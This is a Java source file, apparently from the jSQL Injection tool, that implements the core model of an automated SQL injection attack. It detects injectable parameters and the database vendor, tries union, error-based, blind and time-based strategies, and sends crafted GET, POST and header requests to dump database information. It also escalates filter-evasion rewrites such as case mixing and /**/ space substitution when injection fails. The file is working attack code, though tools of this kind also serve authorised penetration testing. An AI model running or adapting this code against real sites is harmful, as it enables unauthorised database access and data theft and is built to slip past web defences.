/*******************************************************************************
 * Copyhacked (H) 2012-2014.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.injection;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLDecoder;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.PrivilegedActionException;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.security.auth.login.LoginException;

import net.sourceforge.spnego.SpnegoHttpURLConnection;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;
import org.ietf.jgss.GSSException;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.accessible.DataAccess;
import com.jsql.model.accessible.RessourceAccess;
import com.jsql.model.bean.AbstractElementDatabase;
import com.jsql.model.bean.Request;
import com.jsql.model.injection.suspendable.AbstractSuspendable;
import com.jsql.model.injection.suspendable.SuspendableGetDbVendor;
import com.jsql.model.injection.suspendable.SuspendableGetInsertionCharacter;
import com.jsql.model.strategy.NormalStrategy;
import com.jsql.model.strategy.Strategy;
import com.jsql.model.vendor.Vendor;
import com.jsql.util.AuthenticationUtil;
import com.jsql.util.ConfigurationUtil;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.ProxyUtil;
import com.jsql.util.StringUtil;

/**
 * Model in charge of injection.<br>
 * MVC functionalities are provided by ModelObservable.
 */
public class InjectionModel extends AbstractModelObservable {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(InjectionModel.class);
    
    /**
     * List of running jobs.
     */
    public Map<AbstractElementDatabase, AbstractSuspendable> suspendables = new HashMap<>();
    
    /**
     * Current version of application.
     */
    public static final String JSQLVERSION = "0.75";

    /**
     * i.e, -1 in "[..].php?id=-1 union select[..]"
     */
    public String insertionCharacter;
    
    /**
     * HTML source of page successfully responding to
     * multiple fileds selection (select 1,2,3,..).
     */
    public String firstSuccessPageSource;
    
    /**
     * initialUrl transformed to a correct injection url.
     */
    public String sqlIndexes;
    
    /**
     * Current version of database.
     */
    public String versionDatabase;
    
    /**
     * Selected database.
     */
    public String currentDatabase;
    
    /**
     * User connected to database.
     */
    public String currentUser;
    
    /**
     * User authenticated in database.
     */
    public String authenticatedUser;
    
    /**
     * Database vendor currently used.
     * It can be switched to another vendor by automatic detection or manual selection.
     */
    public Vendor currentVendor = Vendor.MYSQL;
    
    /**
     * Database vendor selected by user (default UNDEFINED).
     * If not UNDEFINED then the next injection will be forced to use the selected vendor. 
     */
    public Vendor selectedVendor = Vendor.UNDEFINED;
    
    /**
     * Current injection strategy.
     */
    private Strategy currentStrategy;
    

    /**
     * Allow to directly start an injection after a failed one
     * without asking the user 'Start a new injection?'.
     */
    public boolean isInjectionBuilt = false;

    /**
     * Current evasion step, 0 is 'no evasion'
     */
    public int securitySteps = 0;

    public void instanciationDone() {
        String javaVersion = System.getProperty("java.version");
        String osArch = System.getProperty("os.arch");
        LOGGER.trace("jSQL Injection v" + JSQLVERSION + " on java "+ javaVersion +"-"+ osArch +"");
    }

    /**
     * Prepare the injection process, can be interrupted by the user (via shouldStopAll).
     * Erase all attributes eventually defined in a previous injection.
     */
    public void inputValidation() {
        this.insertionCharacter = null;
        ((NormalStrategy) Strategy.NORMAL.getValue()).visibleIndex = null;
        this.sqlIndexes = null;

        this.versionDatabase = null;
        this.currentDatabase = null;
        this.currentUser = null;
        this.authenticatedUser = null;
        
        this.shouldStopAll = false;
        this.isInjectionBuilt = false;
        
        this.currentStrategy = null;
        
        RessourceAccess.hasFileRight = false;
        
        for (AbstractSuspendable task : this.suspendables.values()) {
            task.stop();
        }
        this.suspendables.clear();

        try {
            ProxyUtil.check();

            ConnectionUtil.check();
            
            // Define insertionCharacter, i.e, -1 in "[..].php?id=-1 union select[..]",
            LOGGER.trace("Get insertion character...");
            
            this.insertionCharacter = new SuspendableGetInsertionCharacter().run();
            new SuspendableGetDbVendor().run();

            // Test each injection methods: time, blind, error, normal
            Strategy.TIME.getValue().checkApplicability();
            Strategy.BLIND.getValue().checkApplicability();
            Strategy.ERRORBASED.getValue().checkApplicability();
            Strategy.NORMAL.getValue().checkApplicability();

            // Choose the most efficient method: normal > error > blind > time
            if (Strategy.NORMAL.getValue().isApplicable()) {
                Strategy.NORMAL.getValue().activateStrategy();
            } else if (Strategy.ERRORBASED.getValue().isApplicable()) {
                Strategy.ERRORBASED.getValue().activateStrategy();
            } else if (Strategy.BLIND.getValue().isApplicable()) {
                Strategy.BLIND.getValue().activateStrategy();
            } else if (Strategy.TIME.getValue().isApplicable()) {
                Strategy.TIME.getValue().activateStrategy();
            } else if (ConfigurationUtil.enableEvasion && securitySteps < 3) {
                // No injection possible, increase evasion level and restart whole process
                securitySteps++;

                LOGGER.warn("Injection not possible, testing evasion n°" + securitySteps + "...");
                
                Request request = new Request();
                request.setMessage("ResetStrategyLabel");
                this.interact(request);
                
                // sinon perte de insertionCharacter entre 2 injections
                ConnectionUtil.getData += insertionCharacter;
                inputValidation();
                
                return;
            } else {
                throw new PreparationException("Injection failed.");
            }

            // Get the initial informations from database
            DataAccess.getDatabaseInfos();

//            // Stop injection if database is too old
//            if (versionDatabase.charAt(0) == '4' || versionDatabase.charAt(0) == '3') {
//                throw new PreparationException("Old database, automatic search is not possible");
//            }

            // Get the databases
            DataAccess.listDatabases();
            
            LOGGER.info("Done.");
            isInjectionBuilt = true;
        } catch (PreparationException | StoppableException e) {
            LOGGER.warn(e.getMessage(), e);
        } finally {
            Request request = new Request();
            request.setMessage("EndPreparation");
            this.interact(request);
        }
    }

    /**
     * Used to inject without need of index (select 1,2,...).<br>
     * -> first index test (getVisibleIndex), errorbased test,
     * and errorbased, blind, timed injection.
     * @return source code of current page
     */
    public String injectWithoutIndex(String dataInjection) {
        return this.inject(dataInjection, false);
    }

    /**
     * Run a HTTP connection to the web server.
     * @param dataInjection SQL query
     * @param responseHeader unused
     * @return source code of current page
     */
    public String inject(String newDataInjection, boolean useVisibleIndex) {
        HttpURLConnection connection = null;
        URL urlObject = null;

        // Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2...", but keep initial url
        String urlUltimate = ConnectionUtil.initialUrl;
        // escape crazy characters, like \
        String dataInjection = newDataInjection;
        urlUltimate = this.buildURL(urlUltimate, useVisibleIndex, dataInjection);

        try {
            urlObject = new URL(urlUltimate);
        } catch (MalformedURLException e) {
            LOGGER.warn("Malformed URL " + e.getMessage(), e);
        }

        /**
         * Build the GET query string infos
         * Add primary evasion
         */
        if (ConnectionUtil.getData != null && !"".equals(ConnectionUtil.getData)) {
            urlUltimate += this.buildQuery("GET", ConnectionUtil.getData, useVisibleIndex, dataInjection);
            try {
                /*
                 * Evasion
                 */
                switch (securitySteps) {
                    /**
                     * 'Plus' character evasion
                     */
                    case 1:
                        urlUltimate = urlUltimate
                            .replaceAll("--\\+", "--")
                            .replaceAll("7330%2b1", "7331");
                    break;
                    
                    /**
                     * Case evasion
                     */
                    case 2:
                        urlUltimate = urlUltimate
                            .replaceAll("union\\+", "uNiOn+")
                            .replaceAll("select\\+", "sElEcT+")
                            .replaceAll("from\\+", "FrOm+")
                            .replaceAll("from\\(", "FrOm(")
                            .replaceAll("where\\+", "wHeRe+")
                            .replaceAll("([AE])=0x", "$1+lIkE+0x");
                    break;
                    
                    /**
                     * Case and Space evasion
                     */
                    case 3:
                        urlUltimate = urlUltimate
                            .replaceAll("union\\+", "uNiOn/**/")
                            .replaceAll("select\\+", "sElEcT/**/")
                            .replaceAll("from\\+", "FrOm/**/")
                            .replaceAll("from\\(", "FrOm(")
                            .replaceAll("where\\+", "wHeRe/**/")
                            .replaceAll("([AE])=0x", "$1/**/lIkE/**/0x");
                        urlUltimate = urlUltimate.replaceAll("--\\+", "--")
                            .replaceAll("\\+", "/**/");
                    break;
                    
                    default:
                        break;
                }

                urlObject = new URL(urlUltimate);
            } catch (MalformedURLException e) {
                LOGGER.warn("Malformed URL " + e.getMessage(), e);
            }
        }
        
        // Define the connection
        try {
            if (AuthenticationUtil.enableKerberos) {
                String kerberosConfiguration = 
                    Pattern
                        .compile("(?s)\\{.*")
                        .matcher(StringUtils.join(Files.readAllLines(Paths.get(AuthenticationUtil.kerberosLoginConf), Charset.defaultCharset()), ""))
                        .replaceAll("")
                        .trim();
                
                SpnegoHttpURLConnection spnego = new SpnegoHttpURLConnection(kerberosConfiguration);
                connection = spnego.connect(urlObject);
            } else {
                connection = (HttpURLConnection) urlObject.openConnection();
            }
            
            connection.setReadTimeout(15000);
            connection.setConnectTimeout(15000);
            connection.setDefaultUseCaches(false);
            HttpURLConnection.setFollowRedirects(ConfigurationUtil.followRedirection);
        } catch (IOException | LoginException | GSSException | PrivilegedActionException e) {
            LOGGER.warn("Error during connection: " + e.getMessage(), e);
        }

        Map<String, Object> msgHeader = new HashMap<>();
        msgHeader.put("Url", urlUltimate);
        
        /**
         * Build the HEADER and logs infos
         * #Need primary evasion
         */
        if (!"".equals(ConnectionUtil.headerData)) {
            for (String header: this.buildQuery("HEADER", ConnectionUtil.headerData, useVisibleIndex, dataInjection).split("\\\\r\\\\n")) {
                Matcher regexSearch = Pattern.compile("(?s)(.*):(.*)").matcher(header);
                if (regexSearch.find()) {
                    String keyHeader = regexSearch.group(1).trim();
                    String valueHeader = regexSearch.group(2).trim();
                    try {
                        if ("Cookie".equalsIgnoreCase(keyHeader)) {
                            connection.addRequestProperty(keyHeader, valueHeader);
                        } else {
                            connection.addRequestProperty(keyHeader, URLDecoder.decode(valueHeader, "UTF-8"));
                        }
                    } catch (UnsupportedEncodingException e) {
                        LOGGER.warn("Unsupported header encoding " + e.getMessage(), e);
                    }
                }
            }
            
            msgHeader.put("Header", this.buildQuery("HEADER", ConnectionUtil.headerData, useVisibleIndex, dataInjection));
        }

        /**
         * Build the POST and logs infos
         * #Need primary evasion
         */
        if (!"".equals(ConnectionUtil.postData)) {
            try {
                connection.setRequestMethod(ConnectionUtil.httpProtocol);
                connection.setDoOutput(true);
                connection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                if (ConnectionUtil.httpProtocol.matches("PUT|POST")) {
                    DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
                    dataOut.writeBytes(this.buildQuery("POST", ConnectionUtil.postData, useVisibleIndex, dataInjection));
                    dataOut.flush();
                    dataOut.close();
                }
                
                msgHeader.put("Post", this.buildQuery("POST", ConnectionUtil.postData, useVisibleIndex, dataInjection));
            } catch (IOException e) {
                LOGGER.warn("Error during POST connection " + e.getMessage(), e);
            }
        }

        msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));

        // Request the web page to the server
        String line, pageSource = "";
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            while ((line = reader.readLine()) != null) {
                pageSource += line + "\r\n";
            }
            reader.close();
        } catch (MalformedURLException e) {
            LOGGER.warn("Malformed URL " + e.getMessage(), e);
        } catch (IOException e) {
            /* lot of timeout in local use */
            LOGGER.warn("Read error " + e.getMessage(), e);
        }
        
        // Disable caching of authentication like Kerberos
        connection.disconnect();
        
        msgHeader.put("Source", pageSource);
        
        // Inform the view about the log infos
        Request request = new Request();
        request.setMessage("MessageHeader");
        request.setParameters(msgHeader);
        this.interact(request);

        // return the source code of the page
        return pageSource;
    }

    /**
     * Build correct data for GET, POST, HEADER.<br>
     * Each can be:<br>
     *  - raw data (no injection)<br>
     *  - SQL query without index requirement<br>
     *  - SQL query with index requirement.
     * @param dataType Current method to build
     * @param paramLead Beginning of the request data
     * @param useVisibleIndex False if request doesn't use indexes
     * @param sqlTrail SQL statement
     * @return Final data
     */
    private String buildURL(String paramLead, boolean useVisibleIndex, String sqlTrail) {
        if (paramLead.contains("*")) {
            if (!useVisibleIndex) {
                return paramLead.replace("*", sqlTrail);
            } else {
                return paramLead.replace("*", 
                    this.sqlIndexes.replaceAll("1337" + ((NormalStrategy) Strategy.NORMAL.getValue()).visibleIndex + "7331",
                    /**
                     * Oracle column often contains $, which is reserved for regex.
                     * => need to be escape with quoteReplacement()
                     */
                    Matcher.quoteReplacement(sqlTrail))
                );
            }
        }
        return paramLead;
    }
    
    private String buildQuery(String dataType, String paramLead, boolean useVisibleIndex, String sqlTrail) {
        if (!ConnectionUtil.method.equalsIgnoreCase(dataType) || ConnectionUtil.initialUrl.contains("*")) {
            return paramLead;
        } else if (paramLead.contains("*")) {
            if (!useVisibleIndex) {
                return paramLead.replace("*", sqlTrail);
            } else {
                return paramLead.replace("*", 
                    this.sqlIndexes.replaceAll("1337" + ((NormalStrategy) Strategy.NORMAL.getValue()).visibleIndex + "7331",
                    /**
                     * Oracle column often contains $, which is reserved for regex.
                     * => need to be escape with quoteReplacement()
                     */
                    Matcher.quoteReplacement(sqlTrail))
                );
            }
        } else {
            if (!useVisibleIndex) {
                return paramLead + sqlTrail;
            } else {
                return paramLead + this.sqlIndexes.replaceAll("1337" + ((NormalStrategy) Strategy.NORMAL.getValue()).visibleIndex + "7331",
                    /**
                     * Oracle column often contains $, which is reserved for regex.
                     * => need to be escape with quoteReplacement()
                     */
                    Matcher.quoteReplacement(sqlTrail));
            }
        }
    }

    /**
     * Display source code in console.
     * @param message Error message
     * @param source Text to display in console
     */
    public void sendResponseFromSite(String message, String source) {
        LOGGER.warn(message + ", response from site:");
        LOGGER.warn(">>>" + source);
    }

    /**
     * Set injection strategy.
     * @param injectionStrategy Strategy for injection
     */
    public void setStrategy(Strategy strategy) {
        this.currentStrategy = strategy;
    }
    
    public Strategy getStrategy() {
        return currentStrategy;
    }

    /**
     * Send each parameters from the GUI to the model in order to
     * start the preparation of injection, the injection process is
     * started in a new thread via model function inputValidation().
     */
    public void controlInput(String getData, String postData, String headerData, String method, String httpProtocol, Boolean isSynchronized) {
        try {
            // Parse url and GET query string
            ConnectionUtil.getData = "";
            Matcher regexSearch = Pattern.compile("(.*)(\\?.*)").matcher(getData);
            if (regexSearch.find()) {
                URL url = new URL(getData);
                ConnectionUtil.initialUrl = regexSearch.group(1);
                if (!"".equals(url.getQuery())) {
                    ConnectionUtil.getData = regexSearch.group(2);
                }
            } else {
                ConnectionUtil.initialUrl = getData;
            }
            
            // Define other methods
            ConnectionUtil.postData = postData;
            ConnectionUtil.headerData = headerData;
            ConnectionUtil.method = method;
            ConnectionUtil.httpProtocol = httpProtocol;
            
            // Reset level of evasion
            this.securitySteps = 0;
            
            if (isSynchronized) {
                this.inputValidation();
            } else {
                // Start the model injection process in a thread
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        InjectionModel.this.inputValidation();
                    }
                }, "InjectionController - controlInput").start();
                
                // Erase everything in the view from a previous injection
                Request request = new Request();
                request.setMessage("ResetInterface");
                this.interact(request);
            }
        } catch (MalformedURLException e) {
            LOGGER.warn(e.getMessage(), e);
            
            // Incorrect URL, reset the start button
            Request request = new Request();
            request.setMessage("EndPreparation");
            this.interact(request);
        }
    }
}
